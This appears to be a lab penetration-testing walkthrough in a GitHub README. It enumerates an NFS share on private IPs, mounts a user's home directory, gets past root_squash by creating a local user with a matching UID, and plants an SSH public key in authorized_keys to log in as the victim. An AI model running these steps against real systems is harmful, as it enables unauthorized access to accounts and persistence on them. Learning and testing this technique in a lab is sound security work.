
<h3>ip victime : 192.168.244.132</h3>

<h3>ip attacker : 192.168.244.133</h3>

------------------------------------------------

in attacker:

#`nmap -p 111,2049 -sV 192.168.244.132`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/nmap scan.png">



now the nfs server is open

you must to khnow what is the share folder:

#`showmount -e 192.168.244.132`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/showmount.png">

--------------------------------------------------------------------------------------------------------

now let's mount the nfs server 

#`mount -t nfs 192.168.244.132:/home/feras-admin /mnt`

#`cd /mnt`

#`ls -la`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/mount .png">

---------------------------------------------------------------------------------------------------------

now let test if the no_root_squash if is enabled

the folder .ssh it is owner for user called 1006 in target  if i change dirictory to .ssh folder the no_root_squash is enable if you deny the no_root_squash is disabled


now i am root in client 

#`whoami`

#`cd .ssh`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/test-root-squash.png">



now the no_root_squash is disabled so how to  bypass this the folder .ssh it is owner for target user named is 1006, in the real the 1006 it is not username in target it is is uid for username in target , so to bypass this you must create user in the attacker with the uid 1006


#`ls -la `

#`useradd -u 1006 test`

#`passwd test`

#`mkdir test`

#`chown test:test /home/test`




<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/by pass.png">

now the user test is created with uid 1006

----------------------------------------------------------------


now lets show the dirictory in /mnt with the owner 

#`cd /mnt`

#`ls -la`

now the user is owner for user test , now lets login in the user test and chang directory to .ssh

#`su test`

$`/bin/bash`

$`cd .ssh`


$`ls -l`


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/ok.png">

now the bypass it is ok

--------------------------------------------------------------------------------------

now let create public and private key for he test user 

$`ssh-keygen -t rsa`

now let's copy the public key for test user /home/test/.ssh/id_rsa.pub to the /mnt/.ssh/ with name  authorized_keys 

$`cp /home/test/.ssh/id_rsa.pub /mnt/.ssh/authorized_keys`

now you must important to chang permssion test to 644

$`chmod 644 /mnt/.ssh/authorized_keys`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/copy the public key.png">

-------------------------------------------------------------------------------------------

now let's login from test user in attacker to the feras-admin in target

$`ssh feras-admin@192.168.244.132`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/y%20pentest%20nfs/login-with feras-admin.png">
